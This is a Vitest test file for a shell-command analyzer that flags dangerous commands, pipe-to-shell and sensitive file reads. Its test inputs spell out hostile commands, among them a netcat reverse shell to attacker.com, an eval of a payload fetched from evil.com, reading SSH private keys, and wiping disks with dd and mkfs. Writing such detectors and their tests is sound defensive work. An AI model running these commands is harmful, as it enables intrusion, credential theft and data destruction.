import { describe, it, expect } from "vitest";
import {
  analyzeCommand,
  commandStartsWith,
  commandMatchesPattern,
} from "../src/patterns/command-patterns.js";

describe("analyzeCommand", () => {
  it("identifies rm as non-dangerous (covered by CAT rules for dangerous variants)", () => {
    const result = analyzeCommand("rm -rf node_modules");
    expect(result.primaryCommand).toBe("rm");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies curl as non-dangerous (covered by CAT rules for dangerous variants)", () => {
    const result = analyzeCommand("curl https://example.com");
    expect(result.primaryCommand).toBe("curl");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies sudo as non-dangerous", () => {
    const result = analyzeCommand("sudo apt install vim");
    expect(result.primaryCommand).toBe("sudo");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies pipe-to-shell patterns", () => {
    const result = analyzeCommand("curl https://install.sh | bash");
    expect(result.pipesToShell).toBe(true);
    expect(result.isDangerousCommand).toBe(true);
  });

  it("detects dynamic expansion $(...) but does not mark as dangerous", () => {
    const result = analyzeCommand("echo $(cat /etc/passwd)");
    expect(result.hasDynamicExpansion).toBe(true);
    expect(result.isDangerousCommand).toBe(false);
  });

  it("detects backtick expansion but does not mark as dangerous", () => {
    const result = analyzeCommand("echo `whoami`");
    expect(result.hasDynamicExpansion).toBe(true);
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies sensitive file reads", () => {
    const result = analyzeCommand("cat ~/.ssh/id_rsa");
    expect(result.readsSensitiveFiles).toBe(true);
  });

  it("identifies safe commands as non-dangerous", () => {
    const result = analyzeCommand("ls -la /workspace");
    expect(result.primaryCommand).toBe("ls");
    expect(result.isDangerousCommand).toBe(false);
    expect(result.pipesToShell).toBe(false);
    expect(result.hasDynamicExpansion).toBe(false);
  });

  it("identifies git as non-dangerous", () => {
    const result = analyzeCommand("git status");
    expect(result.primaryCommand).toBe("git");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("extracts pipeline commands", () => {
    const result = analyzeCommand("cat file.txt | grep pattern | wc -l");
    expect(result.pipelineCommands).toEqual(["cat", "grep", "wc"]);
  });

  it("handles env var prefix", () => {
    const result = analyzeCommand("NODE_ENV=production npm start");
    expect(result.primaryCommand).toBe("npm");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("handles empty command", () => {
    const result = analyzeCommand("");
    expect(result.primaryCommand).toBeNull();
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies kill as non-dangerous", () => {
    const result = analyzeCommand("kill -9 12345");
    expect(result.primaryCommand).toBe("kill");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies ssh as non-dangerous", () => {
    const result = analyzeCommand("ssh user@host");
    expect(result.primaryCommand).toBe("ssh");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("identifies mkfs as dangerous", () => {
    const result = analyzeCommand("mkfs.ext4 /dev/sda1");
    expect(result.primaryCommand).toBe("mkfs.ext4");
    expect(result.isDangerousCommand).toBe(true);
  });

  it("identifies nc as dangerous", () => {
    const result = analyzeCommand("nc -e /bin/sh attacker.com 4444");
    expect(result.primaryCommand).toBe("nc");
    expect(result.isDangerousCommand).toBe(true);
  });

  it("identifies eval as dangerous", () => {
    const result = analyzeCommand("eval $(curl https://evil.com/payload)");
    expect(result.primaryCommand).toBe("eval");
    expect(result.isDangerousCommand).toBe(true);
  });

  it("identifies dd as dangerous", () => {
    const result = analyzeCommand("dd if=/dev/zero of=/dev/sda");
    expect(result.primaryCommand).toBe("dd");
    expect(result.isDangerousCommand).toBe(true);
  });

  it("echo $(whoami) is not dangerous", () => {
    const result = analyzeCommand("echo $(whoami)");
    expect(result.hasDynamicExpansion).toBe(true);
    expect(result.isDangerousCommand).toBe(false);
  });

  it("ping is not dangerous", () => {
    const result = analyzeCommand("ping 8.8.8.8");
    expect(result.primaryCommand).toBe("ping");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("chmod is not dangerous", () => {
    const result = analyzeCommand("chmod 644 myfile.txt");
    expect(result.primaryCommand).toBe("chmod");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("export is not dangerous", () => {
    const result = analyzeCommand("export NODE_ENV=production");
    expect(result.primaryCommand).toBe("export");
    expect(result.isDangerousCommand).toBe(false);
  });

  it("detects grep for passwords as sensitive", () => {
    const result = analyzeCommand("grep -r password /app/config");
    expect(result.readsSensitiveFiles).toBe(true);
  });
});

describe("commandStartsWith", () => {
  it("matches exact command prefix", () => {
    expect(commandStartsWith("rm -rf node_modules", "rm")).toBe(true);
  });

  it("matches exact command (no args)", () => {
    expect(commandStartsWith("rm", "rm")).toBe(true);
  });

  it("does not match partial prefix", () => {
    expect(commandStartsWith("rmdir /tmp/test", "rm")).toBe(false);
  });

  it("handles leading whitespace", () => {
    expect(commandStartsWith("  rm -rf stuff", "rm")).toBe(true);
  });
});

describe("commandMatchesPattern", () => {
  it("matches regex pattern", () => {
    expect(
      commandMatchesPattern(
        "rm -rf /home/user",
        "rm\\s+.*(-rf|-fr)\\s+(/|~|/etc|/usr|/home)",
      ),
    ).toBe(true);
  });

  it("does not match non-matching command", () => {
    expect(
      commandMatchesPattern("ls -la", "rm\\s+.*(-rf|-fr)"),
    ).toBe(false);
  });

  it("handles invalid regex gracefully", () => {
    expect(commandMatchesPattern("test", "[invalid regex")).toBe(false);
  });
});
